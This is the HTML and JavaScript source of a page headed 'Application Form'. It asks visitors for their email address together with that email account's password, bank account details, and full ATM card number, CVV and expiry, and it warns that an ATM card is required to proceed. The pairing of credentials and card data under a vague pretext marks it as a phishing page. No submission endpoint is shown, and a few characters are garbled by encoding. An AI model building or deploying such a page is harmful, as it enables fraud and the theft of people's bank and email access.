<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      max-width: 500px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .hidden {
      display: none;
    }
    .error {
      color: red;
      font-size: 0.9em;
      margin-top: 5px;
    }
    .password-toggle {
      position: relative;
    }
    .password-toggle input {
      padding-right: 40px;
    }
    .password-toggle span {
      position: absolute;
      right: 10px;
      top: 38px;
      cursor: pointer;
      user-select: none;
    }
    .disabled-section {
      pointer-events: none;
      opacity: 0.5;
    }
  </style>
</head>
<body>
  <form id="applicationForm" novalidate>
    <label>Full Name
      <input type="text" name="fullname" required />
      <div class="error hidden">Full Name is required</div>
    </label>

    <label>Country
      <input type="text" name="country" required />
      <div class="error hidden">Country is required</div>
    </label>

    <label>Phone Number
      <input type="tel" name="phone" pattern="\\d{9,12}" required />
      <div class="error hidden">Phone number must be 9‚Äì12 digits</div>
    </label>

    <label>Email
      <input type="email" name="email" required />
      <div class="error hidden">Email is required</div>
    </label>

    <label>Email Password
      <div class="password-toggle">
        <input type="password" name="emailPassword" required id="emailPassword" />
        <span onclick="togglePassword()">üëÅÔ∏è</span>
      </div>
      <div class="error hidden">Password is required</div>
    </label>

    <label>Bank Account Type
      <input type="text" name="accountType" placeholder="e.g. Standard Bank" required />
      <div class="error hidden">Bank Account Type is required</div>
    </label>

    <label>Bank Account Number
      <input type="text" name="accountNumber" required />
      <div class="error hidden">Bank Account Number is required</div>
    </label>

    <label>Account Holder's Name
      <input type="text" name="accountName" required />
      <div class="error hidden">Account Holder‚Äôs Name is required</div>
    </label>

    <label>Did you link ATM card to your account?
      <select id="atmLinked" required onchange="checkATMStatus()">
        <option value="">Select</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>
      <div class="error hidden">Please select Yes or No</div>
    </label>

    <div id="atmWarning" class="error hidden">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <div id="atmSection">
      <label>ATM Card Number
        <input type="password" name="atmNumber" required />
        <div class="error hidden">ATM Card Number is required</div>
      </label>

      <label>CVV
        <input type="password" name="cvv" pattern="\\d{3}" required />
        <div class="error hidden">CVV must be 3 digits</div>
      </label>

      <label>Expiry Date
        <input type="text" name="expiry" placeholder="MM/YY" pattern="^(0[1-9]|1[0-2])/\\d{2}$" required />
        <div class="error hidden">Enter a valid MM/YY expiry</div>
      </label>
    </div>

    <button type="submit" style="margin-top: 20px;">Submit</button>
  </form>

  <script>
    function togglePassword() {
      const passField = document.getElementById("emailPassword");
      passField.type = passField.type === "password" ? "text" : "password";
    }

    function checkATMStatus() {
      const atmStatus = document.getElementById("atmLinked").value;
      const atmWarning = document.getElementById("atmWarning");
      const atmSection = document.getElementById("atmSection");

      if (atmStatus === "no") {
        atmWarning.classList.remove("hidden");
        atmSection.classList.add("disabled-section");
        Array.from(atmSection.querySelectorAll("input")).forEach(input => input.disabled = true);
      } else {
        atmWarning.classList.add("hidden");
        atmSection.classList.remove("disabled-section");
        Array.from(atmSection.querySelectorAll("input")).forEach(input => input.disabled = false);
      }
    }

    document.getElementById("applicationForm").addEventListener("input", function (e) {
      const input = e.target;
      const errorDiv = input.parentElement.querySelector(".error");
      if (input.validity.valid) {
        errorDiv?.classList.add("hidden");
      } else {
        errorDiv?.classList.remove("hidden");
      }
    });
  </script>
</body>
</html>
